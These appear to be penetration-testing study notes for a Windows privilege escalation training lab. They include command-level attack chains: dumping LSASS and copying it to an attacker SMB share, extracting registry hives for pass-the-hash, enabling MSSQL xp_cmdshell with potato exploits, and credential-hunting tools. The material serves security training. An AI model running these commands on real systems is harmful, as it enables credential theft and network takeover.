## Introduction to Windows Privilege Escalation

Windows privilege escalation is the process of moving from a low-privilege foothold to `NT AUTHORITY\SYSTEM` or local/domain administrator. It is a mandatory step in nearly every engagement because most post-exploitation objectives, credential harvesting, lateral movement, and domain takeover all require elevated access. 
***

## Why Escalation Matters

The four primary reasons to escalate on a Windows host are: 

1. Gold image assessment - break out of a hardened standard workstation build
2. Access a local resource that requires higher privileges, such as a database or credential store
3. Gain SYSTEM on a domain-joined machine to dump LSASS and extract domain credentials
4. Harvest credentials for lateral movement or further escalation within the network

***

## The Real-World Scenarios Unpacked

### Scenario 1: No Internet, No USB, Printer VLAN Pivot

The attack chain here demonstrates an important principle: **network restrictions do not stop privilege escalation, they only change the exfiltration method**.

```
1. Manual enumeration reveals a permissions flaw (no tools needed)
2. Escalate to SYSTEM
3. Dump LSASS manually
   -> tasklist /svc | findstr lsass
   -> rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\lsass.dmp full
4. Printer VLAN allows outbound 445 (SMB)
5. Mount SMB share from attack machine via printer network
   -> net use \\<attack_ip>\share /user:user password
6. Copy lsass.dmp to share
7. Crack offline with Mimikatz
   -> sekurlsa::minidump lsass.dmp
   -> sekurlsa::logonpasswords
```

### Scenario 2: Open Share, Virtual Disk Files

The attack chain demonstrates **no exploit needed when credentials are stored in accessible files or images**: 

```
1. Find open file share with .VMDK or .VHDX files
2. Mount virtual disk as a local drive
   -> Right-click .VHDX in Windows Explorer -> Mount
   -> Or: Disk Management -> Action -> Attach VHD
3. Extract registry hives from mounted drive
   -> C:\Windows\System32\config\SYSTEM
   -> C:\Windows\System32\config\SAM
   -> C:\Windows\System32\config\SECURITY
4. Dump hashes offline
   -> secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
5. Pass-the-hash across entire fleet using the gold image local admin hash
   -> crackmapexec smb <range> -u Administrator -H <hash>
```

### Scenario 3: Database to SeImpersonatePrivilege to SYSTEM

This is one of the most common real-world chains in enterprise environments: 

```
1. Find .sql files on file share with database credentials
2. Connect to MSSQL using low-priv DB credentials
   -> sqlcmd -S <server> -U <user> -P <pass>
3. Enable and use xp_cmdshell
   -> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
   -> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
   -> EXEC xp_cmdshell 'whoami';
4. Confirm SeImpersonatePrivilege
   -> EXEC xp_cmdshell 'whoami /priv';
5. Exploit with potato attack
   -> JuicyPotato (Server 2016 and older)
   -> RoguePotato / PrintSpoofer (Server 2019+)
```

***

## Attack Surface Overview

Windows presents far more attack vectors than Linux due to its service-oriented architecture, COM/DCOM subsystems, registry-based configuration, and Windows token privilege model.  The main categories are: 

| Category | Examples |
|---|---|
| Service misconfigurations | Insecure service permissions, unquoted paths, weak binary permissions |
| Registry weaknesses | Writable service keys, AlwaysInstallElevated, AutoLogon credentials |
| Token privileges | SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege |
| Credential theft | LSASS dump, SAM/SECURITY hives, unattended install files, browser storage |
| DLL hijacking | Search order abuse, missing DLLs, writable directories in PATH |
| Scheduled tasks | Writable task binary, writable task XML, weak directory permissions |
| UAC bypass | Various techniques to auto-elevate without prompt |
| Kernel/OS CVEs | EternalBlue, PrintNightmare, HiveNightmare, and others |
| Group policy | GPP passwords, misconfigured LAPS, over-permissive GPO delegation |

***

## Enumeration Tools

In environments where you can load tools, these cover the attack surface automatically. In locked-down environments, all of these checks can be reproduced manually with `cmd.exe` and PowerShell.

```powershell
# WinPEAS - broadest automated coverage, colour-coded output
.\winPEASx64.exe
.\winPEASx64.exe quiet     # no colours, cleaner for piping

# PowerUp - targeted service and registry misconfigurations
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# Key individual PowerUp functions:
Get-UnquotedService              # Unquoted service path candidates
Get-ModifiableServiceFile        # Services with writable binaries
Get-ModifiableService            # Services whose config you can change
Get-RegistryAlwaysInstallElevated  # Check AlwaysInstallElevated policy
Get-RegistryAutoLogon            # Autologon credentials in registry
Invoke-ServiceAbuse              # Directly exploit a modifiable service

# Seatbelt - situational awareness and credential hunting
.\Seatbelt.exe -group=all
.\Seatbelt.exe CredEnum TokenPrivileges AutoRuns

# Snaffler - hunt file shares for sensitive files and credentials
.\Snaffler.exe -s -d <domain> -o snaffler_output.log

# AccessChk (Sysinternals) - granular permission checking
.\accesschk.exe /accepteula -ucqv <service_name>
.\accesschk.exe /accepteula -uwdqs "Everyone" C:\
.\accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\
```

***

## RDP Connection Reference

Most lab environments for this module use RDP access:

```bash
# Basic connection (will prompt for password)
xfreerdp /v:<target_ip> /u:htb-student

# With password and additional options
xfreerdp /v:<target_ip> /u:htb-student /p:<password> /dynamic-resolution /drive:kali,/home/kali/tools

# Pass-through drive mount (useful for transferring tools)
xfreerdp /v:<target_ip> /u:htb-student /p:<password> /drive:share,/tmp/tools

# Ignore certificate errors in lab environments
xfreerdp /v:<target_ip> /u:htb-student /p:<password> /cert:ignore
```

***

## Manual Enumeration Baseline

When no tools are available, these `cmd.exe` commands cover the essential checks: 

```cmd
REM System and patch level
systeminfo
wmic qfe get Caption, HotFixID, InstalledOn

REM Current privileges and groups
whoami /all

REM Local users and groups
net user
net localgroup Administrators

REM Services
sc query state= all
wmic service get name,startname,pathname,startmode

REM Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task\|run\|status\|user"

REM Registry credential locations
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"

REM Unattended install file locations
dir /s /b C:\unattend.xml C:\sysprep.xml C:\sysprep.inf 2>nul
dir /s /b C:\Windows\Panther\unattend.xml 2>nul
dir /s /b "C:\Windows\system32\sysprep\*" 2>nul

REM World-writable directories in common service paths
icacls "C:\Program Files" 2>nul | findstr /i "everyone\|users\|authenticated"
```
